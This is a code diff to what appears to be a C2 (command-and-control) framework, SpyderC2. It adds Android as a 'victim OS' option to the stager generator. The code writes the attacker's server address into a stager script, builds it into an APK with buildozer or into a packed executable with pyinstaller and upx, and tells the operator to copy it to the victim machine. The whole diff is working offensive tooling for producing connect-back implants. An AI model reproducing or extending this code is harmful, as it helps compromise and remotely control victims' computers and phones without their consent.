@@ -19,6 +19,8 @@ from rich.prompt import Confirm
 from rich.panel import Panel
 from rich import print as pprint
 from lib.style import Style
+from subprocess import Popen, PIPE
+import glob
 
 install(show_locals=True,max_frames=5)
 console = Console()
@@ -92,11 +94,11 @@ def docker():
 	return os.path.isfile('/.dockerenv')
 
 def get_victim_os():
-	input = Prompt.ask("Enter Victim OS", choices=["windows", "linux", "back"], default="windows")
+	input = Prompt.ask("Enter Victim OS", choices=["windows", "linux", 'android', "back"], default="windows")
 	return (False if input == 'back' else input)
 
 ## Stager.py has needs the server url where it will connect back and copies the new stager to tmp
-def fill_server_url(args={}):
+def fill_server_url(os_name,args={}):
 	if 'generate' in args and args['generate']:
 		## This is for generting via flags, we take defalt if nothing provided
 		server_ip = args['ip'] if args['ip'] else '0.0.0.0'
@@ -115,7 +117,14 @@ def fill_server_url(args={}):
 	stager_content = open(stager_path,'r').read()
 	stager_content = stager_content.replace("##SERVER_URL##",f"{server_ip}:{server_port}")
 
-	new_stager_path = os.path.join(PATH,'shared','tmp','stager.py')
+	new_stager_name = 'stager.py'
+
+	## We comment out psutil as it has issues with android, for android the python file name needs to be main.py
+	if os_name == 'android':
+		stager_content = stager_content.replace("import psutil","#import psutil")
+		new_stager_name = 'main.py'
+
+	new_stager_path = os.path.join(PATH,'shared','tmp',new_stager_name)
 
 	f = open(new_stager_path,'w+')
 	print(stager_content,file=f)
@@ -196,6 +205,63 @@ def pack_exe(server_logger,exe_path,packer_path):
 		server_logger.info_log(e,'red')
 		return False
 
+def runCmd(cmd,cwd=''):
+	try:
+		print(f"Running cmd - {cmd} in {cwd}\n")
+		if cwd == '':
+			process = Popen(cmd, stdout=PIPE, stderr=PIPE,shell=True)
+		else:
+			process = Popen(cmd, cwd=rf"{cwd}",shell=True)
+		stdout, stderr = process.communicate()
+
+		if process.returncode != 0:
+			raise ValueError(stderr.decode('utf-8'))
+		if stdout != None:
+			op = stdout.decode('utf-8')
+		else:
+			op = ''
+		pprint(f"Command ran successfully, output - {op}\n")
+		return True
+	except Exception as e:
+		return False
+
+
+def install_android_dependencies(path):
+	res = runCmd("chmod +x install-kivy-buildozer-dependencies.sh",os.path.join(path,'../../','utilities','buildozer'))
+	
+	if res:
+		res = runCmd("sh install-kivy-buildozer-dependencies.sh",os.path.join(path,'../../','utilities','buildozer'))
+		if res:
+			pprint("Successfully installed dependencies...")
+			return True
+		else:
+			pprint("[red]Couldn't install dependencies..[/red]")
+			return False
+	else:
+		pprint("[red]Couldn't install dependencies..[/red]")
+		return False
+
+## So here we try running buildozer directly, if it fails we run dependencies and try running again
+def generate_android_stager(path,retry=True):
+	runCmd('buildozer android debug',path)
+	## The return code of the above command is not reliable so checking if the APK is generated
+	files = glob.glob(rf"{os.path.join(path,'bin','*.apk')}")
+	
+	if len(files) != 0:
+		pprint(f"\n[green]APK generation successful. Find it at {files[0]}[/green]")
+		return True
+	else:
+		if retry:
+			pprint("[yellow]Installing dependencies and trying again[/yellow]")
+			res = install_android_dependencies(path)
+			if res:
+				generate_android_stager(path,retry=False)
+			else:
+				pprint(f"\n[red]APK generation not successful.[/red]")
+				return False
+		else:
+			pprint(f"\n[red]APK generation not successful.[/red]")
+			return False
 
 
 def generate_stager(server_logger,args={}):
@@ -206,8 +272,8 @@ def generate_stager(server_logger,args={}):
 	else:
 		os_name = get_victim_os()
 
-	if not os_name or os_name not in ['windows','linux']:
-		server_logger.info_log('Not valid OS name, options - windows, linux')
+	if not os_name or os_name not in ['windows','linux','android']:
+		server_logger.info_log('Not valid OS name, options - windows, linux, android')
 		return False
 
 	## Convert to exe and save
@@ -217,21 +283,28 @@ def generate_stager(server_logger,args={}):
 		os.mkdir(os.path.join(PATH,'shared','tmp'))
 
 
-	## Check for src files to copy
-	if not check_file_existence(PATH,'stager.spec'): return
-	if not check_file_existence(PATH,'requirements.txt'): return
+	## We fill in the User Provided server URL in tne stager.py and move it to tmp and also comment out psutil for android
+	fill_server_url(os_name,args)
 
-	## We fill in the User Provided server URL in tne stager.py and move it to tmp
-	fill_server_url(args)
 
-	if not check_file_existence(PATH,os.path.join('shared','tmp','stager.py')): return
 
-	## Copy files.
-	shutil.copyfile(os.path.join(PATH,'stager.spec'),os.path.join(PATH,'shared','tmp','stager.spec'))
-	shutil.copyfile(os.path.join(PATH,'requirements.txt'),os.path.join(PATH,'shared','tmp','requirements.txt'))
+	if os_name == 'android':
+		if not check_file_existence(PATH,os.path.join('shared','tmp','main.py')): return
+		if not check_file_existence(PATH,'buildozer.spec'): return
+		shutil.copyfile(os.path.join(PATH,'buildozer.spec'),os.path.join(PATH,'shared','tmp','buildozer.spec'))
+		if not check_file_existence(PATH,os.path.join('shared','tmp','buildozer.spec')): return
+	else:
+		if not check_file_existence(PATH,os.path.join('shared','tmp','stager.py')): return
+		## Check for src files to copy
+		if not check_file_existence(PATH,'stager.spec'): return
+		if not check_file_existence(PATH,'requirements.txt'): return
+		## Copy files.
+		shutil.copyfile(os.path.join(PATH,'stager.spec'),os.path.join(PATH,'shared','tmp','stager.spec'))
+		shutil.copyfile(os.path.join(PATH,'requirements.txt'),os.path.join(PATH,'shared','tmp','requirements.txt'))
+		if not check_file_existence(PATH,os.path.join('shared','tmp','stager.spec')): return
+		if not check_file_existence(PATH,os.path.join('shared','tmp','requirements.txt')): return
 
-	if not check_file_existence(PATH,os.path.join('shared','tmp','stager.spec')): return
-	if not check_file_existence(PATH,os.path.join('shared','tmp','requirements.txt')): return
+	
 
 
 	## We will attempt to pack the exe
@@ -242,24 +315,30 @@ def generate_stager(server_logger,args={}):
 	try:
 		if not docker():
 			server_logger.info_log("Generating stager.. Please wait, this might take some time...")
-			subprocess.check_output(f'sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)
-
-			if pack_exe(server_logger,exe_path,packer_path):
-				server_logger.info_log('Sucessfully Packed exe','green')
+			if os_name == 'android':
+				generate_android_stager(os.path.join(PATH,'shared','tmp'))
 			else:
-				server_logger.info_log("Couldn't pack exe",'yellow')
+				subprocess.check_output(f'sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)
+
+				if pack_exe(server_logger,exe_path,packer_path):
+					server_logger.info_log('Sucessfully Packed exe','green')
+				else:
+					server_logger.info_log("Couldn't pack exe",'yellow')
 
 
 
-			print(colored(f"\nStager dumped to {colored(f'SpyderC2/data/shared/tmp/dist/{os_name}','cyan')}. Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
+				print(colored(f"\nStager dumped to {colored(f'SpyderC2/data/shared/tmp/dist/{os_name}','cyan')}. Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
 		else:
 			print("\n")
-			cmd = f'Please run the following command in path [orange_red1]SpyderC2/data/shared/tmp[/orange_red1] on the [bold blue]HOST MACHINE [/bold blue]\n\n'
+			if os_name == 'android':
+				generate_android_stager(os.path.join(PATH,'shared','tmp'))
+			else:
+				cmd = f'Please run the following command in path [orange_red1]SpyderC2/data/shared/tmp[/orange_red1] on the [bold blue]HOST MACHINE [/bold blue]\n\n'
 
-			cmd += f'CMD - [bright_cyan]sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} && sudo ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}[/bright_cyan]\n\n'
+				cmd += f'CMD - [bright_cyan]sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} && sudo ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}[/bright_cyan]\n\n'
 
-			cmd += f'The stager will be generated in [orange_red1]SpyderC2/data/shared/tmp/dist/{os_name}[/orange_red1] on HOST.\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager on victim.'
-			pprint(Panel(cmd, title="[red bold]ATTENTION!"))
+				cmd += f'The stager will be generated in [orange_red1]SpyderC2/data/shared/tmp/dist/{os_name}[/orange_red1] on HOST.\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager on victim.'
+				pprint(Panel(cmd, title="[red bold]ATTENTION!"))
 
 		return True
 	except subprocess.CalledProcessError as grepexc:                                                                                                   
